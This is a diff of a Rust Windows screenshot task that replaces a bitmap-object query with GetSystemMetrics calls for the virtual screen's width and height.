@@ -6,7 +6,7 @@ use miniz_oxide::deflate::compress_to_vec_zlib;
 use tasks::Task;
 use utils::path::{Path, WriteToFile};
 use winapi::um::wingdi::{BitBlt, CreateCompatibleBitmap, CreateCompatibleDC, DeleteDC, DeleteObject, GetCurrentObject, GetDIBits, GetObjectW, SelectObject, BITMAP, BITMAPINFO, BITMAPINFOHEADER, BI_RGB, DIB_RGB_COLORS, OBJ_BITMAP, SRCCOPY};
-use winapi::um::winuser::GetDC as WinGetDC;
+use winapi::um::winuser::{GetDC as WinGetDC, SM_CXVIRTUALSCREEN, SM_CYVIRTUALSCREEN};
 use winapi::um::winuser::{GetSystemMetrics, SM_XVIRTUALSCREEN, SM_YVIRTUALSCREEN};
 
 pub(super) struct ScreenshotTask;
@@ -22,18 +22,8 @@ impl Task for ScreenshotTask {
 unsafe fn capture_screen() -> Result<(i32, i32, Vec<u8>), ()> {
     let x = GetSystemMetrics(SM_XVIRTUALSCREEN);
     let y = GetSystemMetrics(SM_YVIRTUALSCREEN);
-
-    let mut all_desktops: BITMAP = zeroed();
-    let temp_bitmap = GetCurrentObject(WinGetDC(null_mut()), OBJ_BITMAP);
-    
-    GetObjectW(
-        temp_bitmap, 
-        size_of::<BITMAP>() as _, 
-        &mut all_desktops as *mut _ as *mut _,
-    );
-    
-    let width = all_desktops.bmWidth;
-    let height = all_desktops.bmHeight;
+    let width = GetSystemMetrics(SM_CXVIRTUALSCREEN);
+    let height = GetSystemMetrics(SM_CYVIRTUALSCREEN);
     
     let hdc = WinGetDC(null_mut());
     let hdc_mem = CreateCompatibleDC(hdc);
